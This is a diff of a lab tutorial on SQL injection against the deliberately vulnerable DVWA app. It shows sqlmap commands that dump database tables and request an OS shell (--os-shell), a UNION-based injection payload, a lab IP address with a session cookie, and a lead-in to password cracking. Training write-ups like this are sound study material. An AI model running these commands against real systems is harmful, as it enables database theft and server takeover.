@@ -81,7 +81,7 @@ back-end DBMS: MySQL >= 4.1
 The second technique is to save the GET request from Burp Suite to a file and read the file into sqlmap. See the folloiwng example. The GET request, with cookies, is stored in dvwa.txt and read into sqlmap using the **-r** option.
 
 ```
-sqlmap -r dvwa.txt --dump
+sqlmap -r dvwa.txt 
         ___
        __H__                                                                            
  ___ ___[(]_____ ___ ___  {1.6.7#stable}                                                
@@ -116,11 +116,13 @@ Parameter: id (GET)
     Payload: id=1' UNION ALL SELECT CONCAT(0x7171707171,0x61434154445452584e58456b4e516d7143734a756b5444616f6f7a486d547779735a6c7479467871,0x7176706271),NULL#&Submit=Submit
 ```
 
+### Challenge 2: Dump Tables with sqlmap
 
+sqlmap caches results. Cached results reduce the time to complete successive sqlmap commands when testing an application. However, there are times that using cached results is not desired. The sqlmap cache can be ignored using the option **--fresh-queries**. 
 
-sqlmap -u "http://34.171.165.162:8000/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=4ae7cff151a35773cb6253368001f1f6" --dump --fresh-queries --os-shell
+sqlmap -r dvwa.txt --dump --fresh-queries --os-shell
 
-sqlmap -r dvwa.txt --dump 
+sqlmap -r dvwa.txt --dump
 
 Crack passwords
 
